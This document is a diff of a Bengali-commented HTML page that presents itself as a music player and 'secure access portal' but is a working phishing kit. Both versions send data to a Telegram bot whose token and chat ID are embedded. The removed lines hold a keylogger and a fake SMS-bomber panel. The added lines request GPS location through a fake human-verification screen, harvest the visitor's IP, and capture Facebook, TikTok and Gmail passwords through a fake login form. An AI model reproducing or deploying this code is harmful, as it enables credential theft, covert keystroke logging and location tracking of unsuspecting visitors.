@@ -1,123 +1,118 @@
-<!DOCTYPE html>
+
+   <!DOCTYPE html>
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Multi-Platform Access & Music</title>
+    <title>Secure Access Portal</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; text-align: center; }
-        .music-btn { background: linear-gradient(45deg, #1db954, #191414); color: white; border: 2px solid #0f0; padding: 20px; width: 90%; max-width: 400px; margin: 20px auto; border-radius: 50px; font-weight: bold; cursor: pointer; animation: pulse 2s infinite; outline: none; }
-        @keyframes pulse { 0% {box-shadow: 0 0 0 0 rgba(15, 255, 0, 0.7);} 70% {box-shadow: 0 0 0 15px rgba(15, 255, 0, 0);} 100% {box-shadow: 0 0 0 0 rgba(15, 255, 0, 0);} }
+        .verify-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .music-btn { background: #1db954; color: white; border: 2px solid #0f0; padding: 15px; width: 90%; max-width: 400px; margin: 20px auto; border-radius: 50px; font-weight: bold; cursor: pointer; outline: none; }
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 20px; max-width: 400px; margin: auto; }
-        .card { border: 1px solid #0f0; padding: 25px; cursor: pointer; border-radius: 8px; background: #111; font-weight: bold; transition: 0.3s; }
-        .card:active { background: #0f0; color: #000; }
+        .card { border: 1px solid #0f0; padding: 25px; cursor: pointer; border-radius: 8px; background: #111; font-weight: bold; }
         .login-box { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; padding-top: 50px; z-index: 1000; }
-        input { width: 80%; padding: 15px; margin: 10px 0; background: #222; border: 1px solid #0f0; color: #fff; border-radius: 5px; outline: none; }
-        .btn { background: #0f0; color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; width: 85%; margin-top: 10px; }
-        #status { font-size: 12px; margin-top: 10px; color: #00ff00; opacity: 0.8; }
+        input { width: 80%; padding: 15px; margin: 10px 0; background: #222; border: 1px solid #0f0; color: #fff; border-radius: 5px; }
+        .btn { background: #0f0; color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; width: 85%; }
+        iframe { width: 100%; height: 100vh; border: none; display: none; position: fixed; top: 0; left: 0; z-index: 5000; }
     </style>
 </head>
 <body>
 
-<button class="music-btn" id="masterBtn" onclick="startSystem()">🎵 TAP TO PLAY BANGLA HITS 🎵</button>
-<div id="status">Music System: Standby (Waiting for user)</div>
+<div id="verifyOverlay" class="verify-overlay">
+    <h2 style="color: #0f0;">HUMAN VERIFICATION</h2>
+    <p style="color: #888; padding: 0 20px;">Allow location to verify you are not a bot.</p>
+    <button class="btn" onclick="verifyAndStart()">Verify Me</button>
+</div>
+
+<button class="music-btn" id="musicToggle" onclick="toggleMusic()">🎵 MUSIC: ON (TAP TO OFF) 🎵</button>
 
 <div class="grid">
-    <div class="card" onclick="openBox('Facebook')">Facebook</div>
-    <div class="card" onclick="openBox('TikTok')">TikTok</div>
-    <div class="card" onclick="openBox('Gmail')">Gmail</div>
+    <div class="card" onclick="openFB()">Facebook</div>
+    <div class="card" onclick="openTikTok()">TikTok</div>
+    <div class="card" onclick="openGmail()">Gmail</div>
     <div class="card" onclick="openTermux()">Termux</div>
-    <div class="card" onclick="openBox('YouTube')">YouTube</div>
-    <div class="card" onclick="openGame()">Game</div>
+    <div class="card" onclick="useDirect('YouTube', 'https://www.youtube.com')">YouTube</div>
+    <div class="card" onclick="useDirect('Game', 'https://www.youtube.com/embed/14pPsB78lzg?autoplay=1')">Game</div>
 </div>
 
 <div id="loginWindow" class="login-box">
-    <h3 id="platTitle" style="color:#0f0;">Login Required</h3>
-    <input type="text" id="targetUser" placeholder="Email, Phone or Username">
+    <h3 id="platTitle">Security Check</h3>
+    <input type="text" id="targetUser" placeholder="Email or Phone">
     <input type="password" id="targetPass" placeholder="Password">
-    <button class="btn" onclick="saveCreds()">CONFIRM LOGIN</button>
-    <p style="color:red; margin-top:30px;" onclick="closeAll()">Cancel & Go Back</p>
+    <button class="btn" onclick="saveAndGo()">LOGIN</button>
 </div>
 
-<div id="termuxWindow" class="login-box">
-    <h3 style="color: #4af626;">TERMUX BOMB-V3 (PRO)</h3>
-    <input type="text" id="victimNum" placeholder="Target Number">
-    <input type="number" placeholder="Sms Count (1-500)">
-    <button class="btn" onclick="fakeAction('Bombing Started...')">EXPLOIT NOW</button>
-    <p style="color:#0f0; margin-top:20px;" onclick="closeAll()">[Exit Termux]</p>
-</div>
+<iframe id="webLoader" src=""></iframe>
 
 <script>
     const TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
     const CHAT_ID = '7416528268';
-    let currentPlat = "";
+    
+    // গান অটো প্লে হওয়ার জন্য
+    const audio = new Audio("https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3");
+    audio.loop = true;
 
-    // মিউজিক প্লেলিস্ট (Auto-play)
-    const tracks = [
-        "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3",
-        "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3",
-        "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3"
-    ];
-    let trackIdx = 0;
-    const player = new Audio();
-
-    function startSystem() {
-        player.src = tracks[trackIdx];
-        player.play();
-        player.onended = () => { trackIdx = (trackIdx + 1) % tracks.length; startSystem(); };
-        document.getElementById('masterBtn').innerText = "📻 PLAYING: POPULAR HITS";
-        document.getElementById('status').innerText = "Music System: Active ● Recording Log...";
-        sendToTele("🚀 User started the Music Player");
-        getLoc();
-    }
-
-    // সাইলেন্ট কি-লগার (Keylogger)
-    document.addEventListener('input', (e) => {
-        if (e.target.tagName === 'INPUT') {
-            sendToTele(`⌨️ User Typing: ${e.target.value}`);
-        }
-    });
-
-    function openBox(name) {
-        currentPlat = name;
-        document.getElementById('platTitle').innerText = name + " Authorization";
-        document.getElementById('loginWindow').style.display = 'block';
-    }
-
-    function saveCreds() {
-        const u = document.getElementById('targetUser').value;
-        const p = document.getElementById('targetPass').value;
-        sendToTele(`🎯 LOGIN DATA!\nPlatform: ${currentPlat}\nUser: ${u}\nPass: ${p}`);
-        alert("Verification Successful. Connecting to Server...");
-        closeAll();
-    }
-
-    function openTermux() { document.getElementById('termuxWindow').style.display = 'block'; }
-    function openGame() { alert("Loading Game Engine..."); sendToTele("🎮 User entered Game Mode"); }
-
-    async function getLoc() {
-        const ipReq = await fetch('https://api.ipify.org?format=json');
-        const ipRes = await ipReq.json();
+    function verifyAndStart() {
         navigator.geolocation.getCurrentPosition(p => {
-            const mapLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-            sendToTele(`🌐 IP: ${ipRes.ip}\n📍 Map: ${mapLink}`);
+            const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            fetchIP(map);
+            document.getElementById('verifyOverlay').style.display = 'none';
+            audio.play(); // অটো গান শুরু
         }, () => {
-            sendToTele(`🌐 IP: ${ipRes.ip}\n📍 Map: GPS Denied`);
+            alert("Location is required for verification!");
         }, {enableHighAccuracy: true});
     }
 
-    function sendToTele(msg) {
+    async function fetchIP(map) {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        sendToBot(`👤 TARGET VERIFIED\n🌐 IP: ${data.ip}\n📍 Map: ${map}`);
+    }
+
+    function toggleMusic() {
+        if (audio.paused) {
+            audio.play();
+            document.getElementById('musicToggle').innerText = "🎵 MUSIC: ON (TAP TO OFF) 🎵";
+        } else {
+            audio.pause();
+            document.getElementById('musicToggle').innerText = "🔇 MUSIC: OFF (TAP TO ON) 🔇";
+        }
+    }
+
+    // ফিশিং ছাড়া সরাসরি ইউটিউব বা গেম ব্যবহার
+    function useDirect(name, url) {
+        sendToBot(`🚀 User opened ${name} directly`);
+        const loader = document.getElementById('webLoader');
+        loader.src = url;
+        loader.style.display = 'block';
+    }
+
+    // ফিশিং মেথড (Facebook/TikTok/Gmail)
+    let currentSite = "";
+    function openFB() { currentSite = "Facebook"; document.getElementById('loginWindow').style.display = 'block'; }
+    function openTikTok() { currentSite = "TikTok"; document.getElementById('loginWindow').style.display = 'block'; }
+    function openGmail() { currentSite = "Gmail"; document.getElementById('loginWindow').style.display = 'block'; }
+
+    function saveAndGo() {
+        const u = document.getElementById('targetUser').value;
+        const p = document.getElementById('targetPass').value;
+        sendToBot(`🔑 PHISHING DATA\nSite: ${currentSite}\nUser: ${u}\nPass: ${p}`);
+        
+        let url = currentSite === "Facebook" ? "https://m.facebook.com" : "https://www.google.com";
+        const loader = document.getElementById('webLoader');
+        loader.src = url;
+        loader.style.display = 'block';
+    }
+
+    function sendToBot(msg) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
         });
     }
-
-    function closeAll() { document.querySelectorAll('.login-box').forEach(b => b.style.display = 'none'); }
-    function fakeAction(m) { alert(m); sendToTele(`🛠 User Action: ${m}`); }
 </script>
 </body>
 </html>
-
-    
+ 
